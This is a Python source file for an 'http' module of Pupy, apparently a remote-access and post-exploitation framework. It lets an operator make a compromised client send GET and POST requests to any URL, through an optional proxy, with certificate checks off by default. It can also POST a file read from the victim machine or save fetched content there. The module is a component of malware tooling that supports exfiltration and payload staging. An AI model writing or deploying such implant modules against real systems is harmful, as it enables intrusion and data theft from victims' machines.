# -*- coding: utf-8 -*-
from pupylib.PupyModule import *

__class_name__='http'

@config(cat='admin')
class http(PupyModule):
    ''' Trivial Get/Post requests via HTTP protocol '''
    is_module=False

    dependencies = []

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='http', description=self.__doc__)
        self.arg_parser.add_argument('-H', '--header', default=[], action='append',
                                         help='User-Agent=Mozilla X-Forwarded-For=127.0.0.1')
        self.arg_parser.add_argument('-P', '--proxy', help='Proxy URI (socks://127.0.0.1:1234)')
        self.arg_parser.add_argument('-o', '--output', help='Output to file')
        self.arg_parser.add_argument('-i', '--input', help='Input from file (POST)')
        self.arg_parser.add_argument('-v', '--verify', default=False, action='store_true', help='Verify certificate')
        self.arg_parser.add_argument('-r', '--follow-redirects', default=False, action='store_true',
                                     help='Follow redirects')
        self.arg_parser.add_argument('url', help='url')
        self.arg_parser.add_argument('data', nargs='*', default=[], help='Data (POST/urlencode)')

    def run(self, args):
        tinyhttp = self.client.remote('network.lib.tinyhttp')

        http = tinyhttp.HTTP(
            proxy=args.proxy,
            noverify=not args.verify,
            follow_redirects=args.follow_redirects,
            headers=[
                tuple(x.split('=', 1)) for x in (
                    args.header if type(args.header) == list else [
                        args.header
                    ]
                )
            ]
        )

        try:
            if args.input or args.data:
                self.log(
                    self.client.obtain_call(
                        http.post,
                        args.url,
                        data=[
                            tuple(x.split('=', 1)) for x in args.data
                        ],
                        file=args.input,
                        save=args.output
                    )
                )
            else:
                self.log(
                    self.client.obtain_call(
                        http.get,
                        args.url,
                        save=args.output
                    )
                )

        except Exception, e:
            self.error('Error: {}'.format(e.message or e.reason))
